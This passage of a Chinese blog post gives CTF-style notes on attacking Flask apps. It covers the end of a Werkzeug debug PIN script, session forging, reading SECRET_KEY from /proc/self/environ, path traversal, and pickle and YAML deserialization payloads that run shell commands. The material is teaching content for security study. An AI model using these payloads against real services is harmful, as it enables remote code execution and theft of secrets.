class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"></span><br><span class="line">PIN, cookie_name = get_pin_and_cookie_name(username, modname, appname, moddir, mac, machine_id)</span><br><span class="line"><span class="built_in">print</span>(PIN)</span><br></pre></td></tr></table></figure>
+<p>在 Python 不同版本中，&lt;=3.7 <code>h</code> 采用 md5 算法；&gt;3.7
+<code>h</code> 采用 sha1 算法。在以上代码可以给予值
+<code>high_version=True</code> 采用 sha1 算法。</p>
+<h2 id="session-构造">session 构造</h2>
+<p>Flask 中的 session 是通过 secret_key 进行签名的，所以在构造 session
+之前需要获取 secret_key。</p>
+<p>可以使用脚本 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a>
+加密解密 session 的 jwt。</p>
+<p>也可以试图自己运行代码获取伪造 session 值。</p>
+<h2 id="一些巧妙利用">一些巧妙利用</h2>
+<h3 id="secret_key">SECRET_KEY</h3>
+<p>SECRET_KEY 会被存放在环境变量和 <code>config</code> 中，可以考虑读取
+<code>/proc/self/environ</code> 或者使用 <code>env</code> 命令。</p>
+<p>其他的获取方式可以查看 SSTI 的文章内容。</p>
+<h3 id="os.path.join"><code>os.path.join()</code></h3>
+<p><code>os.path.join()</code>
+函数用于拼接两个字符串作为路径，分隔符以系统指定分隔符为主。</p>
+<p>但当两个目录为同级目录时，只会默认返回后一个字符串作为结果，例如
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;/abc/cba&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>需要注意，第二个目录需要是根目录才能被识别为同级目录。</p>
+<p>还有一种利用是目录穿越，但需要注意的是 Python 的目录穿越只有
+<code>../../</code> 的方式。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename = &#x27;../../flag&#x27;</span></span><br><span class="line">os.path.join(<span class="string">&#x27;/temp/pic&#x27;</span>, filename)</span><br></pre></td></tr></table></figure>
+<h3 id="pickle-反序列化注入">pickle 反序列化注入</h3>
+<h4 id="基本原理">基本原理</h4>
+<p>Python 的 <code>__reduce__</code> 魔术方法正是 Python
+类的反序列化方法，我们可以通过注入命令到 <code>__reduce__</code>
+方法中。</p>
+<p>Python 要求 <code>__reduce__</code>
+方法返回一个函数和需要调用的参数（<code>(callable, [para1, para2, ...])</code>），Python
+希望的是通过 callable
+和其参数生成该对象，但实际上我们可以利用这点变相调用漏洞函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (a, ))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">payload = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># pickle.loads(payload)</span></span><br></pre></td></tr></table></figure>
+<p>当运行 <code>pickle.loads(payload)</code> 时，我们将进入 sh。</p>
+<h4 id="opcode">opcode</h4>
+<p>pickle 的 opcode 详解如下</p>
+<table>
+<colgroup>
+<col style="width: 3%">
+<col style="width: 31%">
+<col style="width: 26%">
+<col style="width: 31%">
+<col style="width: 6%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S'xxx'（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr class="odd">
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名:
+属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示：
+<code>b'I01\n'</code> ； <code>FALSE</code> 也可以用 <code>I</code>
+表示： <code>b'I00\n'</code> ，其他 opcode 可以在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。
+由这些opcode我们可以得到一些需要注意的地方：</p>
+<ul>
+<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
+<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
+<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
+<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
+<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
+</ul>
+<p>使用 <code>pickletools</code> 的 <code>dis</code>
+函数可以展示更易识别的序列化后的内容。</p>
+<p>利用 opcode 我们可以更精细化地做事情。</p>
+<h4 id="拼接-opcode">拼接 opcode</h4>
+<p>仅需把第一个 pickle 流结尾表示结束的 <code>.</code>
+去掉后直接拼接第二个 pickle 流即可。</p>
+<h4 id="全局变量覆盖">全局变量覆盖</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;qsdz&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[before] <span class="subst">&#123;secret.name = &#125;</span>&#x27;</span>)</span><br><span class="line">output = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;output = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[after] <span class="subst">&#123;secret.name = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>opcode 解析：</p>
+<ol type="1">
+<li><code>c__main__\nsecret\n</code>，读取 <code>__main__</code> 中的
+<code>secret</code> 模块</li>
+<li><code>(</code>，标记一个 MARK</li>
+<li><code>S'name'\n</code>，生成字符串 <code>'name'</code>
+入栈（并是标记位）</li>
+<li><code>S'qsdz'\n</code>，生成字符串 <code>'qsdz'</code> 入栈</li>
+<li><code>d</code>，将栈-2和栈-1位置的值按 <code>key-value</code>
+对组成字典，然后入栈字典</li>
+<li><code>b</code>，将 <code>key-value</code> 对以
+<code>key=value</code> 的形式赋值属性</li>
+<li><code>.</code>，结束反序列化</li>
+</ol>
+<h4 id="函数执行">函数执行</h4>
+<p>能进行函数执行的 opcode
+有三个，<code>R</code>、<code>i</code>、<code>o</code>，所以有三种方向构造</p>
+<h5 id="r">R</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="i">i</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="o">o</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="实例化对象">实例化对象</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">(S&#x27;qsdz&#x27;</span></span><br><span class="line"><span class="string">S&quot;114514&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name, a.age)</span><br></pre></td></tr></table></figure>
+<h3 id="其他">其他</h3>
+<p>为了解决pickle反序列化的问题，官方给出了使用改写
+<code>Unpickler.find_class()</code>
+方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制
+<code>module</code> 和 <code>name</code>
+并充分考虑到白名单中的各模块和各函数是否有危险。</p>
+<p>由于 pickle
+“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是
+<code>find_class</code> 函数，即 <code>c</code>、<code>i</code> 等
+opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助
+<code>getattr</code>、<code>get</code>等函数。</p>
+<h3 id="yaml-反序列化">yaml 反序列化</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">tuple</span></span><br><span class="line">- !!python/<span class="built_in">object</span>/new:<span class="built_in">map</span></span><br><span class="line">  - !!python/name:<span class="built_in">eval</span></span><br><span class="line">  - [ <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /fllaagg_here &gt; templates/admin.html&#x27;</span>) ]</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>qsdz
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://hasegawaazusa.github.io/flask-note.html" title="flask攻击相关笔记">https://hasegawaazusa.github.io/flask-note.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/flask/" rel="tag"><i class="fa fa-tag"></i> flask</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/flask-ssti-note.html" rel="prev" title="flask-ssti笔记">
+                  <i class="fa fa-chevron-left"></i> flask-ssti笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/nodejs-note.html" rel="next" title="nodejs相关攻击笔记">
+                  nodejs相关攻击笔记 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">592k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">8:58</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
